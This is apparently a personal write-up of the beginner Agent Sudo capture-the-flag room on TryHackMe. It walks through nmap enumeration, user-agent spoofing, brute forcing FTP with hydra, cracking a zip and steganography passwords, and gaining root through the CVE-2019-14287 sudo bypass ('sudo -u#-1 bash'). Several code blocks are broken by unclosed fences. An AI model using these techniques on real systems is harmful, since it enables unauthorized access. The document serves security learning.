## About 
[TryHackMe.com](https://tryhackme.com/)'s [Agent Sudo](https://tryhackme.com/room/agentsudoctf) is a beginner-friendly capture-the-flag virtual machine by [DesKel](https://tryhackme.com/p/DesKel). Agent Sudo has a secret agent theme and challenges users to capture two flags and gain root access by locating and decrypting a series of confidential communications. 

### Note
I have replaced all instances of the virtual machine's ip address with `<target-ip>` throughout this write-up.

## Methodology

We begin our enumeration efforts by running an `nmap` scan on the target machine to understand the ports that are open to network traffic. I start with the `-V`, `-C`, and `-T4` flags. 

```bash
# Nmap 7.92 scan initiated Mon May 23 09:23:53 2022 as: nmap -sVC -T4 -o initial-svc-nmap.out 10.10.166.253
Nmap scan report for 10.10.166.253
Host is up (0.13s latency).

# Nmap done at Mon May 23 09:24:05 2022 -- 1 IP address (1 host up) scanned in 12.65 seconds
```
Now we know that the target is running `vsftpd 3.0.3` on `port 21`, `OpenSSH 7.6p1` on `port 22`, and an `Apache httpd 2.4.29` web server on `port 80` with the `http-title` of `announcement` - all open to `tcp` traffic. 

Next, we visit the web server in a web browser.

`/index.html`
```html
<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```
We're greeted with a message from Agent R, instructing other agents to change their `user-agent` to thier codename for site access. Here I used [User-Agent Switcher](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/) to alter my requests. I began by trying to log in as the boss, chaning my user agent to "R". Unfortunately, we're given a hostile response by the administrator (presumably R himself) for this request:
```html
<head>   
</head>
<body>What are you doing! Are you one of the 25 employees? If not, I going to report this incident



	<title>Annoucement</title>



<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>


</body>
```

Likewise, user-agents `A` and `B` do not work, but `C` redirects us to `/agent_C_attention.php` on the web site:
```html
Attention ----s, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```
Out of curiosity, I tried `J` as a user-agent, but that did not yield anything. However, now that we know about a user named `----s`, we should see if we can access the vsftpd FTP server on port 21. I chose to use `hydra` to attempt to brute force the server. This process went extremely slowly, unfortunately, with several disconnections from the remote host. I assume that this has to do with some form of rate limiting.

```shell
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

Good to know! Let's grab the image files and figure out how to extract Agent J's login password.

I should have used `mget *` here instead. Looking at the two images, I don't see anything immediately interesting. They are cute, though. 

I spent a while viewing the files but don't get anywhere. So I consult the internet. Turns out the clever agents hid a text string inside a data file [you can do this with binaries, too](https://www.howtogeek.com/427805/how-to-use-the-strings-command-on-linux/). Apparently everyone on the internet uses `binwalk` for this scenario. [Binwalk](https://www.kali.org/tools/binwalk/) is a tool for searching a given binary image for embedded files and executable code. Specifically, it is designed for identifying files and code embedded inside of firmware images. They must teach this stuff at spy school.

Let's binwalk...
```shell
â”Œâ”€â”€(virtualtackã‰¿kali-bot)-[~/thm/agent-sudo]
â””â”€$ binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

34820         0x8804          End of Zip archive, footer length: 22

```

`binwalk`, in its omnipotence, has a function to extract known file types, using the `-e` flag.

We also now have the extracted contents of `cutie.png`
```shell
â”Œâ”€â”€(virtualtackã‰¿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
â””â”€$ ls
365  365.zlib  8702.zip  To_agentR.txt
```

Let's unzip the archive:
```shell

Usually `zip` passwords are pretty easy to break in CTFs. Let's see if that's true here:

```shell
â”Œâ”€â”€(virtualtackã‰¿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
â””â”€$ zip2john 8702.zip > 4john

```

It is true. Now we can use `----n` to access the archive and read the contents of `To_agentR.txt`.
```text
Agent C,

We need to send the picture to '-------x' as soon as possible!

By,
Agent R

```

As the result of doing a few CTFs, the name of the picture recipient looks suspiciously like it is encoded in base64. As a reminder: **base64 is not encryption**. This is apparently a [big deal](https://twitter.com/sempf/status/988525614444539904) [for kubernetes folks](https://github.com/sethvargo/base64-is-not-encryption). 

```shell
â”Œâ”€â”€(virtualtackã‰¿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
â””â”€$ touch -------x.txt
                                                                    
â”Œâ”€â”€(virtualtackã‰¿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
â””â”€$ vim -------x.txt
                                                                    
â”Œâ”€â”€(virtualtackã‰¿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
â””â”€$ base64 -d '-------x.txt'
-----1   
```

Reading other write-ups after finishing the box, I learned about [Cyber Chef](https://gchq.github.io/CyberChef/) which looks great for stuff like this in the future.

The next prompt on THM asks for the `steg password`. I don't know what that is, so I search for it and [stegcracker](https://www.kali.org/tools/stegcracker/) tops the list. Let's try it, in conjunction with our remaining alien image `cute-alien.jpg`

```shell
â”Œâ”€â”€(virtualtackã‰¿kali-bot)-[~/thm/agent-sudo]
â””â”€$ stegcracker cute-alien.jpg

StegCracker has been retired following the release of StegSeek, which 
"steghidewill blast through the rockyou.txt wordlist within 1.9 second as opposed to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'cute-alien.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
```

Next time, I will definitely try [StegSeek](https://github.com/RickdeJager/stegseek)! This is going insanely slowly, so I think it's probably not the right way to go. However, the ftp brute-force above took ages too. I'll let it run in the background while I google other steg stuff. 

I learned about [Stegsolve](https://wiki.bi0s.in/steganography/stegsolve/) which is a really cool little utility, but, sadly, not helpful here. The next thing to try is [steghide](https://www.kali.org/tools/steghide/):

```shell

While the secret agents certainly have more knowledge about image-based cryptography, I spot that they've misspelled "autopsy" in the image file name, which, despite being a tiny victory helps my ego.

Now let's try to get root. First, I check to see what our friend `----s` has `sudo` permissions to run:

```shell

    (ALL, !root) /bin/bash
```

Well, that is lucky. I immediately google this command and discover CVE-2019-14287. This exploit works due to some remarkably simple logic. The security policy applied â€“ which allows `----s` to run `bash` as any user except root â€“ is quite sensible. However, unfortunately, `sudo` faithfully interprets `#-1` after the `-u` user flag and, upon checking for user number `-1`,  will run as user `0`: `root`.

```shell     
----s@agent-sudo:~$ sudo -u#-1 bash
root@agent-sudo:~# whoami
root
```

This can also be done with `4294967295` instead of `-u`. h/t [WhiteSource](https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/)

```shell
----s@agent-sudo:~$ sudo -u#4294967295 bash
[sudo] password for ----s: 
root@agent-sudo:~# whoami
root
```

Pretty crazy! 

Now for the final spy message of the box:
```shell
root@agent-sudo:/# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
ðŸŽŒroot flagðŸŽŒ

### Notes
I learned a lot from this box and enjoyed it a lot. In particular, I think building a familiarity with `binwalk` and the various tricks and utilities related to [steganography](https://en.wikipedia.org/wiki/Steganography) - concealing data in other data or objects - will be useful down the road. Understanding and using CVE-2019-14287 was quite helpful, as well.
